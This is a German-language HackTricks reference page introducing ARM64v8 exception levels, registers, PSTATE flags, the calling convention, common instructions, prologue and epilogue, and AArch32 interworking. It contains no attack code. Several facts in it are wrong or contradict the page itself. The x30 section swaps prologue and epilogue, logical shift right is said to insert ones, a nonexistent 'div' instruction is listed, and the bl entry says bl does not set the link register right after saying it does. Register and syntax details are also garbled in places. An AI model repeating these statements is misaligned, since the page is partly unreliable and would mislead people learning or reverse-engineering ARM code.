# Introduction to ARM64v8

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## **Ausnahmeebenen - EL (ARM64v8)**

In der ARMv8-Architektur definieren Ausführungsebenen, bekannt als Ausnahmeebenen (ELs), das Privilegierungsniveau und die Fähigkeiten der Ausführungsumgebung. Es gibt vier Ausnahmeebenen, die von EL0 bis EL3 reichen, von denen jede einen anderen Zweck erfüllt:

1. **EL0 - Benutzermodus**:

* Dies ist das am wenigsten privilegierte Niveau und wird zum Ausführen regulärer Anwendungscode verwendet.
* Anwendungen, die auf EL0 ausgeführt werden, sind voneinander und von der Systemsoftware isoliert, was die Sicherheit und Stabilität erhöht.

2. **EL1 - Betriebssystem-Kernelmodus**:

* Die meisten Betriebssystemkerne laufen auf diesem Niveau.
* EL1 hat mehr Privilegien als EL0 und kann auf Systemressourcen zugreifen, jedoch mit einigen Einschränkungen, um die Systemintegrität sicherzustellen.

3. **EL2 - Hypervisor-Modus**:

* Dieses Niveau wird für die Virtualisierung verwendet. Ein Hypervisor, der auf EL2 läuft, kann mehrere Betriebssysteme (jedes in seinem eigenen EL1) auf derselben physischen Hardware verwalten.
* EL2 bietet Funktionen zur Isolierung und Steuerung der virtualisierten Umgebungen.

4. **EL3 - Sicherer Monitor-Modus**:

* Dies ist das privilegierteste Niveau und wird häufig für sicheres Booten und vertrauenswürdige Ausführungsumgebungen verwendet.
* EL3 kann den Zugriff zwischen sicheren und nicht sicheren Zuständen verwalten und steuern (wie sicheres Booten, vertrauenswürdige OS usw.).

Die Verwendung dieser Ebenen ermöglicht eine strukturierte und sichere Verwaltung verschiedener Aspekte des Systems, von Benutzeranwendungen bis zur privilegiertesten Systemsoftware. ARMv8s Ansatz zu Privilegierungsebenen hilft dabei, verschiedene Systemkomponenten effektiv zu isolieren und somit die Sicherheit und Robustheit des Systems zu verbessern.

## **Register (ARM64v8)**

ARM64 verfügt über **31 Allzweckregister**, die mit `x0` bis `x30` bezeichnet sind. Jedes kann einen **64-Bit** (8-Byte) Wert speichern. Für Operationen, die nur 32-Bit-Werte erfordern, können auf die gleichen Register im 32-Bit-Modus unter Verwendung der Namen w0 bis w30 zugegriffen werden.

1. **`x0`** bis **`x7`** - Diese werden typischerweise als Zwischenregister und zum Übergeben von Parametern an Unterprogramme verwendet.

* **`x0`** trägt auch die Rückgabedaten einer Funktion.

2. **`x8`** - Im Linux-Kernel wird `x8` als Systemaufrufnummer für die `svc`-Anweisung verwendet. **In macOS wird x16 verwendet!**
3. **`x9`** bis **`x15`** - Weitere temporäre Register, oft für lokale Variablen verwendet.
4. **`x16`** und **`x17`** - **Intra-prozedurale Aufrufregister**. Temporäre Register für unmittelbare Werte. Sie werden auch für indirekte Funktionsaufrufe und PLT (Procedure Linkage Table) Stubs verwendet.

* **`x16`** wird als **Systemaufrufnummer** für die **`svc`**-Anweisung in **macOS** verwendet.

5. **`x18`** - **Plattformregister**. Es kann als Allzweckregister verwendet werden, aber auf einigen Plattformen ist dieses Register für plattformspezifische Zwecke reserviert: Zeiger auf den aktuellen Thread-Umgebungsblock in Windows oder um auf die aktuell **ausgeführte Task-Struktur im Linux-Kernel zu zeigen**.
6. **`x19`** bis **`x28`** - Dies sind callee-saved-Register. Eine Funktion muss die Werte dieser Register für ihren Aufrufer erhalten, sodass sie im Stapel gespeichert und vor der Rückkehr zum Aufrufer wiederhergestellt werden.
7. **`x29`** - **Rahmenzeiger** zur Verfolgung des Stapelrahmens. Wenn ein neuer Stapelrahmen erstellt wird, weil eine Funktion aufgerufen wird, wird das **`x29`**-Register im Stapel gespeichert und die **neue** Rahmenzeigeradresse (Stapelzeigeradresse) wird in diesem Register gespeichert.

* Dieses Register kann auch als **Allzweckregister** verwendet werden, obwohl es normalerweise als Referenz für **lokale Variablen** verwendet wird.

8. **`x30`** oder **`lr`**- **Link-Register**. Es enthält die **Rückgabeadresse**, wenn eine `BL` (Branch with Link) oder `BLR` (Branch with Link to Register) Anweisung ausgeführt wird, indem der **`pc`**-Wert in diesem Register gespeichert wird.

* Es kann wie jedes andere Register verwendet werden.
* Wenn die aktuelle Funktion eine neue Funktion aufrufen wird und daher `lr` überschrieben wird, wird es zu Beginn im Stapel gespeichert, dies ist der Epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Speichern von `fp` und `lr`, Platz generieren und neuen `fp` erhalten) und am Ende wiederhergestellt, dies ist der Prolog (`ldp x29, x30, [sp], #48; ret` -> Wiederherstellen von `fp` und `lr` und Rückkehr).

9. **`sp`** - **Stapelzeiger**, der verwendet wird, um den oberen Teil des Stapels zu verfolgen.

* Der **`sp`**-Wert sollte immer mindestens eine **Quadword**-**Ausrichtung** haben, da andernfalls eine Ausrichtungsausnahme auftreten kann.

10. **`pc`** - **Programmzähler**, der auf die nächste Anweisung zeigt. Dieses Register kann nur durch Ausnahmeerzeugungen, Ausnahmerückgaben und Sprünge aktualisiert werden. Die einzigen normalen Anweisungen, die dieses Register lesen können, sind Sprunganweisungen mit Link (BL, BLR), um die **`pc`**-Adresse im **`lr`** (Link-Register) zu speichern.
11. **`xzr`** - **Nullregister**. Auch als **`wzr`** in seiner **32**-Bit-Registerform bezeichnet. Kann verwendet werden, um den Nullwert einfach zu erhalten (üblicher Vorgang) oder um Vergleiche mit **`subs`** wie **`subs XZR, Xn, #10`** durchzuführen, wobei das Ergebnis nirgendwo gespeichert wird (in **`xzr`**).

Die **`Wn`**-Register sind die **32-Bit**-Version des **`Xn`**-Registers.

### SIMD- und Gleitkomma-Register

Darüber hinaus gibt es weitere **32 Register von 128-Bit-Länge**, die in optimierten Single-Instruction-Multiple-Data (SIMD)-Operationen und zur Durchführung von Gleitkommaarithmetik verwendet werden können. Diese werden als Vn-Register bezeichnet, obwohl sie auch in **64**-Bit-, **32**-Bit-, **16**-Bit- und **8**-Bit-Operationen verwendet werden können und dann als **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** und **`Bn`** bezeichnet werden.

### System Registers

**Es gibt Hunderte von Systemregistern**, auch als spezielle Zweckregister (SPRs) bezeichnet, die zur **Überwachung** und **Steuerung** des Verhaltens von **Prozessoren** verwendet werden.\
Sie können nur mit den dedizierten speziellen Anweisungen **`mrs`** und **`msr`** gelesen oder gesetzt werden.

Die speziellen Register **`TPIDR_EL0`** und **`TPIDDR_EL0`** sind häufig beim Reverse Engineering zu finden. Der Suffix `EL0` gibt an, bei welcher **minimalen Ausnahme** das Register zugegriffen werden kann (in diesem Fall ist EL0 die reguläre Ausnahme (Privileg), unter der reguläre Programme ausgeführt werden).\
Sie werden oft verwendet, um die **Basisadresse des Thread-lokalen Speicherbereichs** im Speicher zu speichern. Normalerweise ist das erste lesbar und beschreibbar für Programme, die in EL0 ausgeführt werden, aber das zweite kann von EL0 gelesen und von EL1 (wie Kernel) geschrieben werden.

* `mrs x0, TPIDR_EL0 ; Lese TPIDR_EL0 in x0`
* `msr TPIDR_EL0, X0 ; Schreibe x0 in TPIDR_EL0`

### **PSTATE**

**PSTATE** enthält mehrere Prozesskomponenten, die in das für das Betriebssystem sichtbare **`SPSR_ELx`**-Spezialregister serialisiert sind, wobei X das **Berechtigungs**-**level der ausgelösten** Ausnahme ist (dies ermöglicht die Wiederherstellung des Prozesszustands, wenn die Ausnahme endet).\
Dies sind die zugänglichen Felder:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Die Bedingungsflags **`N`**, **`Z`**, **`C`** und **`V`**:
* **`N`** bedeutet, dass die Operation ein negatives Ergebnis lieferte
* **`Z`** bedeutet, dass die Operation Null ergab
* **`C`** bedeutet, dass die Operation durchgeführt wurde
* **`V`** bedeutet, dass die Operation ein vorzeichenüberlaufenes Ergebnis ergab:
* Die Summe von zwei positiven Zahlen ergibt ein negatives Ergebnis.
* Die Summe von zwei negativen Zahlen ergibt ein positives Ergebnis.
* Bei der Subtraktion, wenn eine große negative Zahl von einer kleineren positiven Zahl abgezogen wird (oder umgekehrt) und das Ergebnis nicht im Bereich der gegebenen Bitgröße dargestellt werden kann.
* Offensichtlich weiß der Prozessor nicht, ob die Operation vorzeichenbehaftet ist oder nicht, daher überprüft er C und V in den Operationen und gibt an, ob ein Übertrag aufgetreten ist, falls er vorzeichenbehaftet war oder nicht.

{% hint style="warning" %}
Nicht alle Anweisungen aktualisieren diese Flags. Einige wie **`CMP`** oder **`TST`** tun dies, und andere, die ein s-Suffix haben wie **`ADDS`**, tun dies auch.
{% endhint %}

* Das aktuelle **Registerbreiten (`nRW`) Flag**: Wenn das Flag den Wert 0 enthält, wird das Programm im AArch64-Ausführungszustand ausgeführt, sobald es fortgesetzt wird.
* Das aktuelle **Ausnahmenlevel** (**`EL`**): Ein reguläres Programm, das in EL0 ausgeführt wird, hat den Wert 0
* Das **Single-Stepping**-Flag (**`SS`**): Wird von Debuggern verwendet, um durch Setzen des SS-Flags auf 1 innerhalb von **`SPSR_ELx`** durch eine Ausnahme einen einzelnen Schritt auszuführen. Das Programm wird einen Schritt ausführen und eine Einzelschritt-Ausnahme auslösen.
* Das **illegale Ausnahme**-Statusflag (**`IL`**): Es wird verwendet, um zu kennzeichnen, wenn eine privilegierte Software einen ungültigen Ausnahmestufenwechsel durchführt, dieses Flag wird auf 1 gesetzt und der Prozessor löst eine illegale Zustandsausnahme aus.
* Die **`DAIF`**-Flags: Diese Flags ermöglichen es einem privilegierten Programm, bestimmte externe Ausnahmen selektiv zu maskieren.
* Wenn **`A`** 1 ist, bedeutet dies, dass **asynchrone Abbrüche** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware-**Interruptanfragen** (IRQs). und das F steht für **Fast Interrupt Requests** (FIRs).
* Die **Stackpointer-Auswahlfahnen** (**`SPS`**): Privilegierte Programme, die in EL1 und höher ausgeführt werden, können zwischen der Verwendung ihres eigenen Stackpointer-Registers und dem Benutzermodell-Stackpointer wechseln (z. B. zwischen `SP_EL1` und `EL0`). Dieser Wechsel wird durch Schreiben in das **`SPSel`**-Spezialregister durchgeführt. Dies kann nicht von EL0 aus erfolgen.

## **Aufrufkonvention (ARM64v8)**

Die ARM64-Aufrufkonvention legt fest, dass die **ersten acht Parameter** einer Funktion in den Registern **`x0` bis `x7`** übergeben werden. **Zusätzliche** Parameter werden auf dem **Stack** übergeben. Der **Rückgabewert** wird im Register **`x0`** zurückgegeben, oder auch in **`x1`**, wenn er 128 Bits lang ist. Die Register **`x19`** bis **`x30`** und **`sp`** müssen über Funktionsaufrufe hinweg **erhalten** bleiben.

Beim Lesen einer Funktion in der Assembly sollte man nach dem **Funktionsprolog und -epilog** suchen. Der **Prolog** beinhaltet normalerweise das **Speichern des Rahmenzeigers (`x29`)**, das **Einrichten** eines **neuen Rahmenzeigers** und das **Zuweisen von Speicherplatz**. Der **Epilog** beinhaltet normalerweise das **Wiederherstellen des gespeicherten Rahmenzeigers** und das **Rückkehren** aus der Funktion.

### Aufrufkonvention in Swift

Swift hat seine eigene **Aufrufkonvention**, die unter [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) gefunden werden kann.

## **Gemeinsame Anweisungen (ARM64v8)**

ARM64-Anweisungen haben im Allgemeinen das Format `Opcode Ziel, Quelle1, Quelle2`, wobei **`Opcode`** die auszuführende **Operation** angibt (wie `add`, `sub`, `mov`, usw.), **`Ziel`** das **Zielregister** ist, in dem das Ergebnis gespeichert wird, und **`Quelle1`** und **`Quelle2`** die **Quellregister** sind. Es können auch unmittelbare Werte anstelle von Quellregistern verwendet werden.

* **`mov`**: **Verschiebt** einen Wert von einem **Register** in ein anderes.
* Beispiel: `mov x0, x1` — Dies verschiebt den Wert von `x1` nach `x0`.
* **`ldr`**: **Lädt** einen Wert aus dem **Speicher** in ein **Register**.
* Beispiel: `ldr x0, [x1]` — Dies lädt einen Wert aus der Speicherstelle, auf die `x1` zeigt, in `x0`.
* **Offset-Modus**: Ein den Ursprungspunkt beeinflussender Offset wird angegeben, zum Beispiel:
* `ldr x2, [x1, #8]`, dies lädt in x2 den Wert von x1 + 8
* `ldr x2, [x0, x1, lsl #2]`, dies lädt in x2 ein Objekt aus dem Array x0, von der Position x1 (Index) \* 4
* **Vorindizierter Modus**: Hier werden Berechnungen auf den Ursprung angewendet, das Ergebnis wird erhalten und auch der neue Ursprung im Ursprung gespeichert.
* `ldr x2, [x1, #8]!`, dies lädt `x1 + 8` in `x2` und speichert in x1 das Ergebnis von `x1 + 8`
* `str lr, [sp, #-4]!`, Speichert den Link-Register in sp und aktualisiert das Register sp
* **Nachindizierter Modus**: Ähnlich wie der vorherige, aber die Speicheradresse wird abgerufen und dann der Offset berechnet und gespeichert.
* `ldr x0, [x1], #8`, lädt `x1` in `x0` und aktualisiert x1 mit `x1 + 8`
* **PC-relative Adressierung**: In diesem Fall wird die zu ladende Adresse relativ zum PC-Register berechnet
* `ldr x1, =_start`, Dies lädt die Adresse, an der das Symbol `_start` beginnt, in x1 relativ zum aktuellen PC.
* **`str`**: **Speichert** einen Wert aus einem **Register** im **Speicher**.
* Beispiel: `str x0, [x1]` — Dies speichert den Wert in `x0` in der Speicherstelle, auf die `x1` zeigt.
* **`ldp`**: **Lädt ein Paar Register**. Diese Anweisung **lädt zwei Register** aus **aufeinanderfolgenden Speicher**stellen. Die Speicheradresse wird normalerweise durch Hinzufügen eines Offsets zum Wert in einem anderen Register gebildet.
* Beispiel: `ldp x0, x1, [x2]` — Dies lädt `x0` und `x1` aus den Speicherstellen bei `x2` und `x2 + 8`.
* **`stp`**: **Speichert ein Registerpaar**. Diese Anweisung **speichert zwei Register** an **aufeinanderfolgenden Speicher**stellen. Die Speicheradresse wird normalerweise durch Hinzufügen eines Offsets zum Wert in einem anderen Register gebildet.
* Beispiel: `stp x0, x1, [sp]` — Dies speichert `x0` und `x1` an den Speicherstellen bei `sp` und `sp + 8`.
* `stp x0, x1, [sp, #16]!` — Dies speichert `x0` und `x1` an den Speicherstellen bei `sp+16` und `sp + 24`, und aktualisiert `sp` mit `sp+16`.
* **`add`**: **Addiert** die Werte zweier Register und speichert das Ergebnis in einem Register.
* Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Ziel
* Xn2 -> Operand 1
* Xn3 | #imm -> Operand 2 (Register oder Immediate)
* \[shift #N | RRX] -> Führe eine Verschiebung oder RRX aus
* Beispiel: `add x0, x1, x2` — Addiert die Werte in `x1` und `x2` zusammen und speichert das Ergebnis in `x0`.
* `add x5, x5, #1, lsl #12` — Dies entspricht 4096 (eine 1, die 12 Mal verschoben wird) -> 1 0000 0000 0000 0000
* **`adds`** Führt ein `add` aus und aktualisiert die Flags
* **`sub`**: **Subtrahiert** die Werte zweier Register und speichert das Ergebnis in einem Register.
* Überprüfe die **`add`** **Syntax**.
* Beispiel: `sub x0, x1, x2` — Subtrahiert den Wert in `x2` von `x1` und speichert das Ergebnis in `x0`.
* **`subs`** Dies ist wie sub, aber aktualisiert die Flaggen
* **`mul`**: **Multipliziert** die Werte von **zwei Registern** und speichert das Ergebnis in einem Register.
* Beispiel: `mul x0, x1, x2` — Multipliziert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
* **`div`**: **Dividiert** den Wert eines Registers durch ein anderes und speichert das Ergebnis in einem Register.
* Beispiel: `div x0, x1, x2` — Teilt den Wert in `x1` durch `x2` und speichert das Ergebnis in `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Logische Verschiebung nach links**: Fügt 0en vom Ende hinzu und verschiebt die anderen Bits nach vorne (multipliziert um n-mal 2)
* **Logische Verschiebung nach rechts**: Fügt 1en am Anfang hinzu und verschiebt die anderen Bits nach hinten (dividiert um n-mal 2 bei unsigned)
* **Arithmetische Verschiebung nach rechts**: Wie **`lsr`**, aber anstelle von 0en, wenn das MSB eine 1 ist, werden \*\*1en hinzugefügt (\*\*dividiert um n-mal 2 bei signed)
* **Rechtsrotation**: Wie **`lsr`**, aber was auch immer von rechts entfernt wird, wird links angehängt
* **Rechtsrotation mit Erweiterung**: Wie **`ror`**, aber mit dem Carry-Flag als "höchstwertigem Bit". Das Carry-Flag wird also zum Bit 31 verschoben und das entfernte Bit zum Carry-Flag.
* **`bfm`**: **Bitfeldverschiebung**, diese Operationen **kopieren Bits `0...n`** von einem Wert und platzieren sie an den Positionen **`m..m+n`**. Die **`#s`** gibt die **linkste Bitposition** an und **`#r`** die **Rechtsrotation**.
* Bitfeldverschiebung: `BFM Xd, Xn, #r`
* Signierte Bitfeldverschiebung: `SBFM Xd, Xn, #r, #s`
* Unsignierte Bitfeldverschiebung: `UBFM Xd, Xn, #r, #s`
* **Bitfeldextraktion und -einfügung:** Kopiert ein Bitfeld aus einem Register und kopiert es in ein anderes Register.
* **`BFI X1, X2, #3, #4`** Fügt 4 Bits von X2 ab dem 3. Bit von X1 ein
* **`BFXIL X1, X2, #3, #4`** Extrahiert von X2 vier Bits ab dem 3. Bit und kopiert sie in X1
* **`SBFIZ X1, X2, #3, #4`** Sign-erweitert 4 Bits von X2 und fügt sie in X1 ab Bitposition 3 ein, wobei die rechten Bits auf Null gesetzt werden
* **`SBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 von X2, erweitert das Vorzeichen und platziert das Ergebnis in X1
* **`UBFIZ X1, X2, #3, #4`** Null-erweitert 4 Bits von X2 und fügt sie in X1 ab Bitposition 3 ein, wobei die rechten Bits auf Null gesetzt werden
* **`UBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 von X2 und platziert das null-erweiterte Ergebnis in X1.
* **Vorzeichen erweitern zu X:** Erweitert das Vorzeichen (oder fügt einfach 0en in der ungesignten Version hinzu) eines Werts, um Operationen damit durchzuführen:
* **`SXTB X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 auf X1** (`W2` ist die Hälfte von `X2`) um die 64 Bits zu füllen
* **`SXTH X1, W2`** Erweitert das Vorzeichen einer 16-Bit-Zahl **von W2 auf X1**, um die 64 Bits zu füllen
* **`SXTW X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 auf X1**, um die 64 Bits zu füllen
* **`UXTB X1, W2`** Fügt 0en (unsigned) zu einem Byte **von W2 auf X1** hinzu, um die 64 Bits zu füllen
* **`extr`:** Extrahiert Bits aus einem bestimmten **Paar von konkatenierten Registern**.
* Beispiel: `EXTR W3, W2, W1, #3` Dies wird **W1+W2** konkatenieren und von Bit 3 von W2 bis Bit 3 von W1 extrahieren und in W3 speichern.
* **`cmp`**: **Vergleicht** zwei Register und setzt Bedingungsflags. Es ist ein **Alias von `subs`**, wobei das Zielregister auf das Nullregister gesetzt wird. Nützlich, um festzustellen, ob `m == n`.
* Es unterstützt die **gleiche Syntax wie `subs`**
* Beispiel: `cmp x0, x1` — Vergleicht die Werte in `x0` und `x1` und setzt die Bedingungsflags entsprechend.
* **`cmn`**: **Vergleicht negativ** Operand. In diesem Fall ist es ein **Alias von `adds`** und unterstützt die gleiche Syntax. Nützlich, um festzustellen, ob `m == -n`.
* **`ccmp`**: Bedingter Vergleich, ein Vergleich, der nur durchgeführt wird, wenn ein vorheriger Vergleich wahr war und speziell die nzcv-Bits setzt.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> Wenn x1 != x2 und x3 < x4, springe zu func
* Dies liegt daran, dass **`ccmp`** nur ausgeführt wird, wenn der **vorherige `cmp` ein `NE` war**, wenn nicht, werden die Bits `nzcv` auf 0 gesetzt (was der `blt`-Vergleich nicht erfüllt).
* Dies kann auch als `ccmn` verwendet werden (gleich, aber negativ, wie `cmp` vs `cmn`).
* **`tst`**: Überprüft, ob beide Werte des Vergleichs gleichzeitig 1 sind (funktioniert wie ein ANDS, ohne das Ergebnis irgendwo zu speichern). Nützlich, um ein Register mit einem Wert zu überprüfen und zu prüfen, ob eines der Bits des im Wert angegebenen Registers 1 ist.
* Beispiel: `tst X1, #7` Überprüfen, ob eines der letzten 3 Bits von X1 1 ist
* **`teq`**: XOR-Operation, bei der das Ergebnis verworfen wird
* **`b`**: Bedingungsloser Sprung
* Beispiel: `b myFunction`
* Beachten Sie, dass dies den Link-Register nicht mit der Rücksprungadresse füllt (nicht geeignet für Unterprogrammaufrufe, die zurückkehren müssen)
* **`bl`**: **Sprung** mit Link, verwendet, um eine **Unterfunktion aufzurufen**. Speichert die **Rücksprungadresse in `x30`**.
* Beispiel: `bl myFunction` — Ruft die Funktion `myFunction` auf und speichert die Rücksprungadresse in `x30`.
* Beachten Sie, dass dies den Link-Register nicht mit der Rücksprungadresse füllt (nicht geeignet für Unterprogrammaufrufe, die zurückkehren müssen)
* **`blr`**: **Sprung** mit Link zum Register, verwendet, um eine **Unterfunktion aufzurufen**, bei der das Ziel in einem **Register angegeben** ist. Speichert die Rücksprungadresse in `x30`. (Dies ist
* Beispiel: `blr x1` — Ruft die Funktion auf, deren Adresse in `x1` enthalten ist, und speichert die Rücksprungadresse in `x30`.
* **`ret`**: **Rückkehr** aus dem **Unterprogramm**, normalerweise unter Verwendung der Adresse in **`x30`**.
* Beispiel: `ret` — Dies kehrt aus dem aktuellen Unterprogramm unter Verwendung der Rücksprungadresse in `x30` zurück.
* **`b.<cond>`**: Bedingte Sprünge
* **`b.eq`**: **Springe, wenn gleich**, basierend auf der vorherigen `cmp`-Anweisung.
* Beispiel: `b.eq label` — Wenn die vorherige `cmp`-Anweisung zwei gleiche Werte gefunden hat, springt dies zu `label`.
* **`b.ne`**: **Branch if Not Equal**. Diese Anweisung überprüft die Bedingungsflags (die von einer vorherigen Vergleichsanweisung gesetzt wurden) und springt zu einem Label oder einer Adresse, wenn die verglichenen Werte nicht gleich waren.
* Beispiel: Nach einer `cmp x0, x1` Anweisung, `b.ne label` — Wenn die Werte in `x0` und `x1` nicht gleich waren, springt dies zu `label`.
* **`cbz`**: **Vergleichen und Springen bei Null**. Diese Anweisung vergleicht ein Register mit Null und springt zu einem Label oder einer Adresse, wenn sie gleich sind.
* Beispiel: `cbz x0, label` — Wenn der Wert in `x0` Null ist, springt dies zu `label`.
* **`cbnz`**: **Vergleichen und Springen bei Nicht-Null**. Diese Anweisung vergleicht ein Register mit Null und springt zu einem Label oder einer Adresse, wenn sie nicht gleich sind.
* Beispiel: `cbnz x0, label` — Wenn der Wert in `x0` nicht Null ist, springt dies zu `label`.
* **`tbnz`**: Bit testen und bei Nicht-Null springen
* Beispiel: `tbnz x0, #8, label`
* **`tbz`**: Bit testen und bei Null springen
* Beispiel: `tbz x0, #8, label`
* **Bedingte Auswahloperationen**: Dies sind Operationen, deren Verhalten je nach den bedingten Bits variiert.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Wenn wahr, X0 = X1, wenn falsch, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Wenn wahr, Xd = Xn + 1, wenn falsch, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = NICHT(Xm)
* `cinv Xd, Xn, cond` -> Wenn wahr, Xd = NICHT(Xn), wenn falsch, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = - Xm
* `cneg Xd, Xn, cond` -> Wenn wahr, Xd = - Xn, wenn falsch, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Wenn wahr, Xd = 1, wenn falsch, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Wenn wahr, Xd = \<alle 1>, wenn falsch, Xd = 0
* **`adrp`**: Berechnet die **Seitenadresse eines Symbols** und speichert sie in einem Register.
* Beispiel: `adrp x0, symbol` — Dies berechnet die Seitenadresse von `symbol` und speichert sie in `x0`.
* **`ldrsw`**: **Lädt** einen vorzeichenbehafteten **32-Bit**-Wert aus dem Speicher und **erweitert ihn auf 64** Bit.
* Beispiel: `ldrsw x0, [x1]` — Dies lädt einen vorzeichenbehafteten 32-Bit-Wert aus der Speicherstelle, auf die `x1` zeigt, erweitert ihn auf 64 Bit und speichert ihn in `x0`.
* **`stur`**: **Speichert einen Registerwert an einer Speicherstelle**, unter Verwendung eines Offsets von einem anderen Register.
* Beispiel: `stur x0, [x1, #4]` — Dies speichert den Wert in `x0` in der Speicheradresse, die 4 Bytes größer ist als die Adresse, die sich derzeit in `x1` befindet.
* **`svc`** : Führt einen **Systemaufruf** durch. Es steht für "Supervisor Call". Wenn der Prozessor diese Anweisung ausführt, **wechselt er vom Benutzermodus in den Kernelmodus** und springt an eine spezifische Speicherstelle, an der sich der **Systemaufrufbehandlungscode des Kernels** befindet.
* Beispiel:

```armasm
mov x8, 93  ; Lädt die Systemaufrufnummer für exit (93) in das Register x8.
mov x0, 0   ; Lädt den Exit-Statuscode (0) in das Register x0.
svc 0       ; Führt den Systemaufruf durch.
```

### **Funktionsprolog**

1. **Speichern des Link-Registers und des Frame-Zeigers im Stack**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Richten Sie den neuen Rahmenzeiger ein**: `mov x29, sp` (richtet den neuen Rahmenzeiger für die aktuelle Funktion ein)
3. **Platz auf dem Stapel für lokale Variablen reservieren** (falls erforderlich): `sub sp, sp, <Größe>` (wobei `<Größe>` die Anzahl der benötigten Bytes ist)

### **Funktionsepilog**

1. **Lokale Variablen freigeben (falls welche zugewiesen wurden)**: `add sp, sp, <Größe>`
2. **Stellen Sie den Verbindungsspeicher und den Rahmenzeiger wieder her**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Rückkehr**: `ret` (gibt die Kontrolle an den Aufrufer zurück, indem die Adresse im Link-Register verwendet wird)

## AARCH32 Ausführungszustand

Armv8-A unterstützt die Ausführung von 32-Bit-Programmen. **AArch32** kann in einem von **zwei Befehlssätzen** ausgeführt werden: **`A32`** und **`T32`** und kann zwischen ihnen über **`interworking`** wechseln.\
**Privilegierte** 64-Bit-Programme können die **Ausführung von 32-Bit-Programmen** planen, indem sie einen Ausnahmeebenentransfer zur niedriger privilegierten 32-Bit-Ausführung ausführen.\
Beachten Sie, dass der Übergang von 64-Bit auf 32-Bit mit einer niedrigeren Ausnahmeebene erfolgt (zum Beispiel ein 64-Bit-Programm in EL1, das ein Programm in EL0 auslöst). Dies wird durch Setzen des **Bits 4 von** **`SPSR_ELx`** Spezialregister **auf 1** durchgeführt, wenn der `AArch32`-Prozess-Thread bereit ist, ausgeführt zu werden, und der Rest von `SPSR_ELx` speichert die **`AArch32`**-Programme CPSR. Anschließend ruft der privilegierte Prozess die **`ERET`**-Anweisung auf, damit der Prozessor in den **`AArch32`**-Modus übergeht und je nach CPSR in A32 oder T32 wechselt\*\*.\*\*

Das **`interworking`** erfolgt unter Verwendung der J- und T-Bits von CPSR. `J=0` und `T=0` bedeutet **`A32`** und `J=0` und `T=1` bedeutet **T32**. Dies bedeutet im Wesentlichen, dass das **niedrigste Bit auf 1 gesetzt wird**, um anzuzeigen, dass der Befehlssatz T32 ist.\
Dies wird während der **interworking Branch-Anweisungen** gesetzt, kann aber auch direkt mit anderen Anweisungen gesetzt werden, wenn der PC als Zielregister festgelegt ist. Beispiel:

Ein weiteres Beispiel:

```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```

### Register

Es gibt 16 32-Bit-Register (r0-r15). Von r0 bis r14 können sie für jede Operation verwendet werden, jedoch sind einige von ihnen normalerweise reserviert:

* `r15`: Programmzähler (immer). Enthält die Adresse des nächsten Befehls. In A32 aktuell + 8, in T32 aktuell + 4.
* `r11`: Rahmenzeiger
* `r12`: Intra-prozeduraler Aufrufregister
* `r13`: Stapelzeiger
* `r14`: Link-Register

Darüber hinaus werden Register in **`banked Registern`** gesichert. Dies sind Speicherorte, die die Registerwerte speichern und schnelle Kontextwechsel in der Ausnahmebehandlung und privilegierte Operationen ermöglichen, um das manuelle Speichern und Wiederherstellen der Register jedes Mal zu vermeiden. Dies wird durch **Speichern des Prozessorzustands von `CPSR` in das `SPSR`** des Prozessormodus, zu dem die Ausnahme genommen wird, erreicht. Bei der Rückkehr von der Ausnahme wird der **`CPSR`** aus dem **`SPSR`** wiederhergestellt.

